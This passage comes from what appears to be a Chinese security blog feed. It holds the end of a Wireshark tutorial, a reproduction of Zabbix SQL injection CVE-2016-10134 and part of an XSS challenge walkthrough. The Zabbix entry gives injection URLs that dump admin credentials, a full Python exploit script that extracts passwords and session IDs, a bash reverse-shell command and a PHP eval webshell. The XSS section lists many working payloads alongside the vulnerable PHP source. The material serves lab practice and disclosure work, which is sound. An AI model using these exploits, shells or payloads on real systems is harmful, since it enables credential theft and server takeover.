title="数据包搜索"></a>数据包搜索</h3><p>Ctrl + F，一般选择字符串方式搜索，左侧选择分组内容（列表、详情、字节流）。</p><h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>选中想要还原的流量包，右键选中，选择追踪流—TCP流/UDP流/SSL流/HTTP流。</p><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>Wireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：</p><p>选中http文件传输流量包，在分组详情中找到data或者Line-based text data:text/html层，鼠标右键点击 – 选中 导出分组字节流。</p><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节；在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3），最后点击save as按钮导出。</p><p>参考：</p><p><a href="https://blog.csdn.net/daxueba/article/details/46911511" target="_blank" rel="noopener">Wireshark数据抓包教程之认识捕获分析数据包</a></p><p><a href="https://www.freebuf.com/column/199838.html" target="_blank" rel="noopener">CTF流量分析之wireshark使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zabbix-SQL注入-getshell-CVE-2016-10134</title>
      <link href="/2019/05/21/zabbix-SQL%E6%B3%A8%E5%85%A5-getshell-CVE-2016-10134/"/>
      <url>/2019/05/21/zabbix-SQL%E6%B3%A8%E5%85%A5-getshell-CVE-2016-10134/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><p>Zabbix 的latest.php中的toggle_ids[]或jsrpc.php中的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。</p><h2 id="二、漏洞条件"><a href="#二、漏洞条件" class="headerlink" title="二、漏洞条件"></a>二、漏洞条件</h2><p>版本：</p><ul><li>2.2.x</li><li>3.3.0-3.03</li></ul><h2 id="三、复现漏洞"><a href="#三、复现漏洞" class="headerlink" title="三、复现漏洞"></a>三、复现漏洞</h2><p>感谢<a href="https://vulhub.org/#/environments/zabbix/CVE-2016-10134/" target="_blank" rel="noopener">Vulhub</a>提供的漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/vulhub/zabbix/CVE-2016-10134#注意自己的安装路径</span><br><span class="line">docker-compose up -d#启动zabbix3.0.3</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558410510855.png" alt="1558410510855"></p><p>第一种方式需要：zabbix开启guest权限，guest的默认密码为空。</p><p>输入账号<code>guest</code>，密码为空，登陆游客账户。</p><p>登陆成功后，查看cookie中的<code>zbx_sessionid</code>，复制后16位字符</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558410873676.png" alt="1558410873676"></p><p>然后将<code>8a7f592d81c1ebd4</code>当作sid的值，访问如下链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/latest.php?output=ajax&amp;sid=8a7f592d81c1ebd4&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p>注入成功：</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558411124994.png" alt="1558411124994"></p><p>如果guset被禁用的话，还可以使用另一种注入方式，无需账号登录。通过jsrpc.php触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558411371613.png" alt="1558411371613"></p><p>管理员账号密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(1,substring((select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1,20),1)+or+1=1)%23</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558415550757.png" alt="1558415550757"></p><p>updatexml()有32位长度限制,所以使用substring拼接得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~Admin~5fce1b3e34b520afeffb37ce08c7cd66~</span><br></pre></td></tr></table></figure><p>密码存储经过加密加盐的，从第九位开始算，截16个，去掉盐值，然后cmd5破解。</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558416909826.png" alt="1558416909826"></p><p>附上一个网上的exp，可以省点力气：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Date: 2016/8/18</span></span><br><span class="line"><span class="comment"># Created by 独自等待</span></span><br><span class="line"><span class="comment"># 博客 http://www.waitalone.cn/</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deteck_Sql</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">u'检查是否存在SQL注入'</span></span><br><span class="line">    payload = <span class="string">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = urllib2.urlopen(url + payload, timeout=<span class="number">10</span>).read()</span><br><span class="line">    <span class="keyword">except</span> Exception, msg:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key_reg = re.compile(<span class="string">r"INSERT\s*INTO\s*profiles"</span>)</span><br><span class="line">        <span class="keyword">if</span> key_reg.findall(response):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_Inject</span><span class="params">(sql)</span>:</span></span><br><span class="line">    <span class="string">u'获取特定sql语句内容'</span></span><br><span class="line">    payload = url + <span class="string">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2="</span> + urllib2.quote(</span><br><span class="line">        sql) + <span class="string">"&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = urllib2.urlopen(payload, timeout=<span class="number">10</span>).read()</span><br><span class="line">    <span class="keyword">except</span> Exception, msg:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result_reg = re.compile(<span class="string">r"Duplicate\s*entry\s*'~(.+?)~1"</span>)</span><br><span class="line">        results = result_reg.findall(response)</span><br><span class="line">        <span class="keyword">if</span> results:</span><br><span class="line">            <span class="keyword">return</span> results[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># os.system(['clear', 'cls'][os.name == 'nt'])</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">60</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t   Python Zabbix&lt;3.0.4 SQL注入 Exploit'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t    Blog：http://www.waitalone.cn/'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t\t   Code BY： 独自等待'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t\t   Time：2016-08-18'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">60</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'用法: '</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' Zabbix 网站地址'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'实例: '</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' http://www.waitalone.cn/'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] != <span class="string">'/'</span>: url += <span class="string">'/'</span></span><br><span class="line">    passwd_sql = <span class="string">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span></span><br><span class="line">    session_sql = <span class="string">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span></span><br><span class="line">    <span class="keyword">if</span> deteck_Sql():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'Zabbix 存在SQL注入漏洞!\n'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'管理员  用户名密码：%s'</span> % sql_Inject(passwd_sql)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'管理员  Session_id：%s'</span> % sql_Inject(session_sql)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'Zabbix 不存在SQL注入漏洞!\n'</span></span><br></pre></td></tr></table></figure><p>直接获取到密码和session_id</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558419601590.png" alt="1558419601590"></p><p>登陆进后台，可通过script等功能轻易直接获取zabbix服务器的操作系统权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 8989#攻击者服务器开启监听</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/8989 0&gt;&amp;1#设置反弹shell脚本</span><br><span class="line">#或者写一句话</span><br><span class="line">echo&quot;&lt;?php eval($_POST[cmd])?&gt;&quot; &gt; /usr/share/webapps/zabbix/shell.php</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558420615542.png" alt="1558420615542"></p><p>然后随便找台内网主机选择执行该脚本即可</p><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>1、禁用后台用户guest账号（第一种注入要求此账号启用）。</p><p>2、升级到zabbix的最新版。</p><p>3、zabbix的server和agent都不要以root启动</p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><ul><li><p><a href="https://blog.csdn.net/csacs/article/details/86656618" target="_blank" rel="noopener">https://blog.csdn.net/csacs/article/details/86656618</a> </p></li><li><p><a href="https://vulhub.org/#/environments/zabbix/CVE-2016-10134/" target="_blank" rel="noopener">https://vulhub.org/#/environments/zabbix/CVE-2016-10134/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS挑战之旅</title>
      <link href="/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
      <url>/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="没有任何过滤"><a href="#没有任何过滤" class="headerlink" title="没有任何过滤"></a>没有任何过滤</h3><p>根据提示点击图片</p><p><img src="/2019/05/20/XSS挑战之旅/1558054268267.png" alt="1558054268267"></p><p>跳转到如下页面</p><p><img src="/2019/05/20/XSS挑战之旅/1558054405501.png" alt="1558054405501"></p><p>发现url通过get方法传递参数</p><p>修改参数为666</p><p><img src="/2019/05/20/XSS挑战之旅/1558054498678.png" alt="1558054498678"></p><p>发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558054637265.png" alt="1558054637265"></p><p>没有任何过滤，成功执行payload</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：没有做任何过滤</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="部分过滤"><a href="#部分过滤" class="headerlink" title="部分过滤"></a>部分过滤</h3><p>输入内容666</p><p><img src="/2019/05/20/XSS挑战之旅/1558054961618.png" alt="1558054961618"></p><p>发现有两处输出相应内容的地方，第一处和上一关相同，尝试下同一paylaod</p><p><img src="/2019/05/20/XSS挑战之旅/1558055118753.png" alt="1558055118753"></p><p>发现<code>&lt;&gt;</code>被实体化转义掉了，这一处无法再进行构造了。</p><p>接下来对另一处进行构造</p><p><img src="/2019/05/20/XSS挑战之旅/1558055268881.png" alt="1558055268881"></p><p>发现<code>&lt;&gt;</code>没有被转义，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558055385539.png" alt="1558055385539"></p><p>成功执行payload，便于查看代码，我把alert去掉</p><p><img src="/2019/05/20/XSS挑战之旅/1558055539475.png" alt="1558055539475"></p><p>可以看到成功闭合前后标签，所以script标签里的js代码可以成功执行</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>有两个输出，第一个输出使用htmlspeciachars()进行转义，第二个没有任何过滤，可以在这里进行构造payload。</p><p>两种方法：</p><ol><li><p>不逃逸input标签，闭合引号添加事件触发xss</p><p>鼠标移动至该标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>等等很多事件，这里贴个网上的链接<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p></li><li><p>逃逸出input标签,使用其他标签触发xss</p><p><code>&lt;script&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure><p>等等</p></li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="实体化转义绕过"><a href="#实体化转义绕过" class="headerlink" title="实体化转义绕过"></a>实体化转义绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558056793437.png" alt="1558056793437"></p><p>看起来跟level一样，试一下闭合掉value属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558057130653.png" alt="1558057130653"></p><p>闭合语句虽然没有问题，但是看起来被转义掉了</p><p><img src="/2019/05/20/XSS挑战之旅/1558056967968.png" alt="1558056967968"></p><p>双引号被转义，再尝试一下单引号<code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558057294923.png" alt="1558057294923"></p><p>可以看出来 <code>value=&quot;&quot;</code> 成功闭合，但是 <code>&lt;&gt;</code> 依旧被转义</p><p>再尝试另一种办法，添加事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558057537275.png" alt="1558057537275"></p><p>可以看到成功触发事件属性里的js代码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>两个输出点都做了htmlspecialchars()转义，但是第二个拼接的语句使用了单引号<code>&#39;</code>，而且htmlspecialchars()函数使用默认参数不会对单引号进行转义，所以可以使用单引号闭合前面的属性</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="事件属性逃逸"><a href="#事件属性逃逸" class="headerlink" title="事件属性逃逸"></a>事件属性逃逸</h3><p>跟上关很像，试一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558057712688.png" alt="1558057712688"></p><p>发现<code>&lt;&gt;</code>全部被过滤掉了，那就使用事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>成功执行payload</p><p><img src="/2019/05/20/XSS挑战之旅/1558096380758.png" alt="1558096380758"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第二个输出点对<code>&lt;&gt;</code>进行了替换，使用事件属性进行构造payload</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>构造如下payload</p><p><img src="/2019/05/20/XSS挑战之旅/1558096540426.png" alt="1558096540426"></p><p>发现只有script被和谐了， ~ o(<em>￣▽￣</em>)ブ</p><p>使用非<code>&lt;script&gt;</code>的html标签绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558098248009.png" alt="1558098248009"></p><p>使用触发事件绕过</p><p><img src="/2019/05/20/XSS挑战之旅/1558098351438.png" alt="1558098351438"></p><p>发现on被过滤，大小写也不行，暂没有找到不用on的😂</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>首先使用strtolower()函数把字符串转换为小写，然后对<code>&lt;script</code>和<code>on</code>进行replace替换，那就用不了事件属性了，只能使用闭合标签的方式</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>script被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100639552.png" alt="1558100639552"></p><p>src被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100187489.png" alt="1558100187489"></p><p>href被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100233619.png" alt="1558100233619"></p><p>on被过滤，事件属性不行了</p><p><img src="/2019/05/20/XSS挑战之旅/1558100422464.png" alt="1558100422464"></p><p>有一点点尬住了，看一下源码</p><figure class="highlight php"><table><tr><td 